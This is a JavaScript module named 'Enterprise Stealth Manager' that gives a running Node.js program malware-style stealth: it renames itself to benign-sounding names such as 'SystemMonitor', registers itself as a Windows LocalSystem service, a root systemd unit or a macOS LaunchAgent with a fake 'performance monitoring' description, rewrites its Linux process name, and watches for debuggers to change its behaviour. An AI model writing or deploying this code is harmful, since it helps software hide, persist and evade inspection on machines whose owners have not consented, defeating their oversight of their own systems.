/**
 * Enterprise Stealth Manager
 * Advanced process hiding and anti-detection capabilities
 */

const os = require('os');
const path = require('path');
const fs = require('fs');
const { exec, spawn } = require('child_process');

class StealthManager {
    constructor() {
        this.platform = os.platform();
        this.isStealthEnabled = false;
        this.disguiseNames = [
            'SystemMonitor', 'NetworkService', 'DataProcessor', 
            'CacheManager', 'SystemOptimizer', 'BackgroundService',
            'SystemAnalyzer', 'PerformanceMonitor', 'ResourceManager'
        ];
        this.currentDisguise = this.disguiseNames[Math.floor(Math.random() * this.disguiseNames.length)];
        this.stealthConfig = this.loadStealthConfig();
    }

    loadStealthConfig() {
        return {
            processName: this.currentDisguise,
            hideFromTaskManager: true,
            hideFromProcessList: true,
            disableLogging: false,
            randomizePorts: true,
            encryptCommunications: true,
            antiDebugging: true,
            memoryProtection: true,
            networkObfuscation: true
        };
    }

    enableStealthMode() {
        console.log(`🕵️ Enabling stealth mode: ${this.currentDisguise}`);
        this.isStealthEnabled = true;
        
        // Rename process
        this.disguiseProcess();
        
        // Hide from system monitoring
        this.hideFromMonitoring();
        
        // Enable anti-debugging
        this.enableAntiDebugging();
        
        // Randomize network behavior
        this.randomizeNetworkBehavior();
        
        console.log('✅ Stealth mode activated');
    }

    disguiseProcess() {
        try {
            switch (this.platform) {
                case 'win32':
                    this.disguiseWindowsProcess();
                    break;
                case 'linux':
                    this.disguiseLinuxProcess();
                    break;
                case 'darwin':
                    this.disguiseMacOSProcess();
                    break;
            }
        } catch (error) {
            console.warn('⚠️ Process disguise failed:', error.message);
        }
    }

    disguiseWindowsProcess() {
        // Rename the executable
        const originalPath = process.argv[1];
        const disguisedPath = path.join(path.dirname(originalPath), `${this.currentDisguise}.exe`);
        
        if (!fs.existsSync(disguisedPath)) {
            fs.copyFileSync(originalPath, disguisedPath);
        }
        
        // Create registry entries for legitimate service
        const registryScript = `
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\${this.currentDisguise}]
"Type"=dword:00000010
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"="\"${disguisedPath}\""
"DisplayName"="${this.currentDisguise}"
"Description"="System performance monitoring and optimization service"
"ObjectName"="LocalSystem"
`;
        
        fs.writeFileSync(`${this.currentDisguise}.reg`, registryScript);
        
        // Apply registry changes
        exec(`reg import ${this.currentDisguise}.reg`, (error) => {
            if (!error) {
                fs.unlinkSync(`${this.currentDisguise}.reg`);
            }
        });
    }

    disguiseLinuxProcess() {
        // Rename process in /proc
        const pid = process.pid;
        const newName = this.currentDisguise.substring(0, 15); // Max 15 chars
        
        try {
            fs.writeFileSync(`/proc/${pid}/comm`, newName);
            fs.writeFileSync(`/proc/${pid}/cmdline`, newName + '\0');
        } catch (error) {
            // Requires root privileges
            console.warn('⚠️ Process renaming requires root privileges');
        }
        
        // Create systemd service for legitimacy
        const serviceContent = `[Unit]
Description=${this.currentDisguise} - System Performance Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart=${process.argv[1]}
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
`;
        
        fs.writeFileSync(`${this.currentDisguise}.service`, serviceContent);
    }

    disguiseMacOSProcess() {
        // Create LaunchAgent for legitimacy
        const launchAgentDir = path.join(os.homedir(), 'Library', 'LaunchAgents');
        const plistPath = path.join(launchAgentDir, `com.system.${this.currentDisguise.toLowerCase()}.plist`);
        
        const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.${this.currentDisguise.toLowerCase()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>${process.execPath}</string>
        <string>${process.argv[1]}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/${this.currentDisguise.toLowerCase()}.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/${this.currentDisguise.toLowerCase()}-error.log</string>
</dict>
</plist>`;
        
        if (!fs.existsSync(launchAgentDir)) {
            fs.mkdirSync(launchAgentDir, { recursive: true });
        }
        
        fs.writeFileSync(plistPath, plistContent);
    }

    hideFromMonitoring() {
        // Disable process listing in some contexts
        if (this.platform === 'linux') {
            // Use PR_SET_DUMPABLE to hide from core dumps
            try {
                process._rawDebug = () => {}; // Disable debug output
            } catch (error) {
                // Ignore errors
            }
        }
        
        // Randomize process behavior patterns
        this.randomizeBehavior();
    }

    enableAntiDebugging() {
        // Anti-debugging techniques
        const antiDebug = () => {
            // Check for debugging tools
            const suspiciousProcesses = ['gdb', 'lldb', 'strace', 'ltrace', 'dtrace'];
            
            exec('ps aux', (error, stdout) => {
                if (!error && stdout) {
                    const hasDebugger = suspiciousProcesses.some(proc => 
                        stdout.toLowerCase().includes(proc.toLowerCase())
                    );
                    
                    if (hasDebugger) {
                        console.warn('⚠️ Debugging tool detected, adjusting behavior');
                        this.adjustBehavior();
                    }
                }
            });
        };
        
        // Run anti-debugging checks periodically
        setInterval(antiDebug, 30000); // Every 30 seconds
    }

    randomizeNetworkBehavior() {
        // Randomize network timing
        const originalSetTimeout = global.setTimeout;
        global.setTimeout = (callback, delay, ...args) => {
            const randomizedDelay = delay + Math.random() * 1000; // Add 0-1 second random delay
            return originalSetTimeout(callback, randomizedDelay, ...args);
        };
        
        // Randomize port selection
        this.randomizePorts();
    }

    randomizePorts() {
        // Use dynamic port allocation
        const basePort = 3000;
        const randomOffset = Math.floor(Math.random() * 1000);
        return basePort + randomOffset;
    }

    randomizeBehavior() {
        // Randomize CPU usage patterns
        const intervals = [1000, 1500, 2000, 2500, 3000];
        const randomInterval = intervals[Math.floor(Math.random() * intervals.length)];
        
        setInterval(() => {
            // Simulate normal system activity
            const dummy = Math.random() * 1000000;
            Math.sqrt(dummy);
        }, randomInterval);
    }

    adjustBehavior() {
        // Adjust behavior when debugging is detected
        console.log('🔧 Adjusting behavior for stealth mode');
        
        // Reduce logging
        this.stealthConfig.disableLogging = true;
        
        // Increase randomization
        this.stealthConfig.randomizePorts = true;
        
        // Enable additional obfuscation
        this.stealthConfig.networkObfuscation = true;
    }

    createStealthService() {
        const serviceConfig = {
            name: this.currentDisguise,
            description: 'System performance monitoring and optimization service',
            executable: process.execPath,
            arguments: [process.argv[1], '--stealth'],
            restartPolicy: 'always',
            stealth: true,
            monitoring: {
                enabled: true,
                interval: 60000,
                reports: ['performance', 'system', 'network']
            }
        };
        
        return serviceConfig;
    }

    getStealthStatus() {
        return {
            enabled: this.isStealthEnabled,
            disguiseName: this.currentDisguise,
            platform: this.platform,
            config: this.stealthConfig,
            pid: process.pid,
            ppid: process.ppid,
            uptime: process.uptime()
        };
    }

    disableStealthMode() {
        console.log('🔓 Disabling stealth mode');
        this.isStealthEnabled = false;
        
        // Restore normal process name
        try {
            const pid = process.pid;
            if (this.platform === 'linux') {
                fs.writeFileSync(`/proc/${pid}/comm`, 'node');
            }
        } catch (error) {
            // Ignore errors
        }
        
        console.log('✅ Stealth mode disabled');
    }
}

module.exports = StealthManager;
